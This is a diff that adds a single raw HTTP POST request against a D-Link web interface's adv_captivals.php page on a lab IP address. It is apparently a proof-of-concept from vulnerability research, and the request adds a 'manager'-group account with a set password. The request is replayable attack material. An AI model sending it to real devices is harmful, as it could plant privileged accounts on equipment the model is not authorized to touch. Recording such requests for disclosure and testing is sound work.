@@ -1,0 +1,16 @@
+POST /adv_captivals.php HTTP/1.1
+Host: 192.168.33.53:32768
+Content-Length: 845
+Cache-Control: max-age=0
+Accept-Language: zh-CN,zh;q=0.9
+Origin: http://192.168.33.53:32768
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.33.53:32768/adv_captivals.php
+Accept-Encoding: gzip, deflate, br
+Cookie: dlink_uid=wnmuscuyur
+Connection: keep-alive
+
+ACTION_POST=adv_captivals&f_filter_ip1=&f_filter_ip2=&f_filter_ip3=&f_filter_ip4=&f_filter_mask1=&f_filter_mask2=&f_filter_mask3=&f_filter_mask4=&which_delete=&which_edit=&f_action=add&random_s1=&random_s2=&random_s3=&random_s4=&random_s5=&random_s6=&random_s7=&random_s8=&random_s9=&random_s10=&random_s11=&random_s12=&random_s13=&random_s14=&random_s15=&random_s16=&random_s17=&random_s18=&random_s19=&random_s20=&end_date=&encry_type=1&serial_cnt=&duration=&end_year=2014&end_month=1&end_day=1&hour=1&device=&filter1=192.168.0.3&filter2=192.168.0.4&filter3=192.168.0.5&filter4=192.168.0.6&r_name=123&r_password=1234123134&r_group=manager&radius_ip=&radius_port=1812&radius_sec=&acc_mode=0&acc_ip=&acc_port=1813&acc_sec=&ldap_ip=&ldap_port=389&ldap_auth=0&ldap_name=&ldap_password=&base_dn=&attribute=&identity=&pop3_ip=&pop3_port=&ssl_state=0
